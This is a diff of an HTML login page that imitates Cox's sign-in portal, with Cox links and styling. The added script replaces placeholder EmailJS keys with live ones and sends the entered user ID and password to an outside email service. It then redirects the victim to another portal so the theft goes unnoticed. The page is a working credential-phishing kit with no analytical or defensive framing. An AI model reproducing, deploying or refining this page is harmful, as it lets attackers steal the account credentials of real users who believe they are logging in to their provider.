@@ -6,6 +6,7 @@
 <title>Cox Login</title>
 <script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
 <style>
+  /* Same CSS from your existing code */
   * { box-sizing: border-box; }
 
   body, html {
@@ -17,16 +18,15 @@
     min-height: 100vh;
   }
 
-  /* Fixed Header with gradient bottom border and centered logo */
   .header {
     position: fixed;
     top: 0; left: 0;
     width: 100%;
     height: 60px;
-    background-color: white;
-    display: flex; 
+    background: white;
+    display: flex;
     align-items: center;
-    justify-content: center; /* horizontally center logo */
+    justify-content: center;
     padding: 0 2rem;
     z-index: 10;
     border-bottom: none;
@@ -35,23 +35,21 @@
   .header::after {
     content: "";
     position: absolute;
-    bottom: 0;
-    left: 0;
+    bottom: 0; left: 0;
     height: 10px;
     width: 100%;
-    background: linear-gradient(90deg, rgba(0, 170, 244, 1) 30%, rgba(0, 210, 88, 1) 95%, rgba(0, 210, 88, 1) 100%);
+    background: linear-gradient(90deg, rgba(0,170,244,1) 30%, rgba(0,210,88,1) 95%, rgba(0,210,88,1) 100%);
     pointer-events: none;
     z-index: 5;
   }
   .header img {
-    height: 48px; /* increased size */
-    padding-right: 45px; /* pushes image left within header */
+    height: 48px;
+    padding-right: 20px;
     position: relative;
     z-index: 10;
-    display: block; /* remove inline spacing */
+    display: block;
   }
 
-  /* Container split into 50% each */
   .container {
     display: flex;
     flex: 1 0 auto;
@@ -59,7 +57,6 @@
     margin-top: 60px;
   }
 
-  /* Left panel with white background */
   .left-panel {
     position: relative;
     width: 50%;
@@ -67,27 +64,29 @@
     display: flex;
     justify-content: center;
     align-items: flex-start;
+    flex-direction: column;
   }
 
-  /* Form wrapper with overlap */
   .form-wrapper {
     background-color: #f2f6f7;
-    width: 80%;
+    width: 75%;
     padding: 50px 105px;
     border-radius: 1px;
     box-shadow: 0 0 1px rgba(0,0,0,0.1);
     position: relative;
     right: -30%;
-    margin-top: 80px;
+    margin-top: 20px;
+    display: flex;
+    flex-direction: column;
   }
 
   h1 {
-    margin: 0 0 20px;
+    margin: 0 0 10px 0;
     font-weight: 600;
     font-size: 32px;
     color: #255993;
     font-family: "Cera Bold", "Cera Medium";
-    text-align: center; /* Center the heading text */
+    text-align: center;
   }
 
   form {
@@ -111,7 +110,6 @@
     font-size: 16px;
   }
 
-  /* Checkbox container */
   .checkbox-container {
     display: flex;
     align-items: center;
@@ -126,7 +124,6 @@
     height: 16px;
   }
 
-  /* Sign in button styles */
   button {
     height: 36px;
     background-color: #0078d2;
@@ -139,19 +136,16 @@
     padding: 0 25px;
     align-self: flex-start;
   }
-
   button:hover {
     background-color: #005ea3;
   }
 
-  /* Vertical links below button with no margin between */
   .links-container {
     margin-top: 20px;
     display: flex;
     flex-direction: column;
     align-items: flex-start;
   }
-
   .links-container a {
     font-size: 13px;
     color: #0078d2;
@@ -160,7 +154,6 @@
     margin-bottom: 0;
     line-height: 1.3;
   }
-
   .links-container a:last-child {
     margin-bottom: 0;
   }
@@ -172,7 +165,6 @@
       url('https://i.imghippo.com/files/alE4561SRY.jpg') no-repeat center center / cover;
   }
 
-  /* Footer with same gradient border on top */
   .footer {
     flex-shrink: 0;
     height: 40px;
@@ -187,11 +179,10 @@
   .footer::before {
     content: "";
     position: absolute;
-    top: 0;
-    left: 0;
+    top: 0; left: 0;
     height: 10px;
     width: 100%;
-    background: linear-gradient(90deg, rgba(0, 170, 244, 1) 30%, rgba(0, 210, 88, 1) 95%, rgba(0, 210, 88, 1) 100%);
+    background: linear-gradient(90deg, rgba(0,170,244,1) 30%, rgba(0,210,88,1) 95%, rgba(0,210,88,1) 100%);
     pointer-events: none;
     z-index: 5;
   }
@@ -203,7 +194,7 @@
     z-index: 10;
   }
 
-  /* Responsive adjustments */
+  /* Responsive */
   @media(max-width: 768px) {
     .container {
       flex-direction: column-reverse;
@@ -214,11 +205,10 @@
       width: 100%;
       height: 50vh;
     }
-    /* Adjust margin to move form vertically on mobile */
     .form-wrapper {
       position: static;
       width: 90%;
-      margin: -80px auto 0 auto;
+      margin: -40px auto 0 auto;
       right: 0;
       padding: 30px 20px;
     }
@@ -242,19 +232,18 @@
   <div class="left-panel">
     <div class="form-wrapper">
       <h1>Welcome back</h1>
-      <form id="signin-form">
-        <label for="user_email">User ID</label>
-        <input type="email" id="user_email" name="user_email" placeholder=" " required />
-
-        <label for="user_password">Password</label>
-        <input type="password" id="user_password" name="user_password" placeholder=" " required />
+      <form id="loginForm" name="loginForm" novalidate>
+        <label for="username">User ID</label>
+        <input type="email" id="username" name="username" placeholder=" " required />
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder=" " required />
 
         <div class="checkbox-container">
           <input type="checkbox" id="remember_id" name="remember_id" />
           <label for="remember_id">Remember user ID</label>
         </div>
 
-        <button type="submit">Sign In</button>
+        <button type="submit" id="nextBtn">Sign In</button>
 
         <div class="links-container">
           <a href="https://www.cox.com/myprofile/forgot-userid.html?finalview=" target="_blank" rel="noopener noreferrer">Forgot User ID?</a>
@@ -273,24 +262,27 @@
 </div>
 
 <script>
-  (function(){
-    emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
-  })();
+  emailjs.init("SdkmRe8WZ7itEba9z"); // your public key
+  
+  const loginForm = document.getElementById("loginForm");
 
-  const form = document.getElementById('signin-form');
-  form.addEventListener('submit', function(event) {
-    event.preventDefault();
-    const templateParams = {
-      user_email: form.user_email.value,
-      user_password: form.user_password.value,
-      remember_id: form.remember_id.checked ? "Yes" : "No"
-    };
-    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
-      .then(() => {
-        alert('Sign-in information sent successfully!');
-        form.reset();
-      }, () => {
-        alert('Failed to send the sign-in information. Please try again.');
+  loginForm.addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    if (!loginForm.checkValidity()) {
+      // You can add custom client-side validation here if needed
+      
+      alert("Please fill out all required fields correctly.");
+      return;
+    }
+
+    emailjs.sendForm("service_zuj2d2a", "template_tvd86sp", "#loginForm")
+      .then(function(response) {
+        console.log("SUCCESS!", response.status, response.text);
+        window.location.href = "https://portal.tds.net"; // redirect URL on success
+      }, function(error) {
+        console.error("FAILED...", error);
+        alert("Failed to send. Please try again.");
       });
   });
 </script>
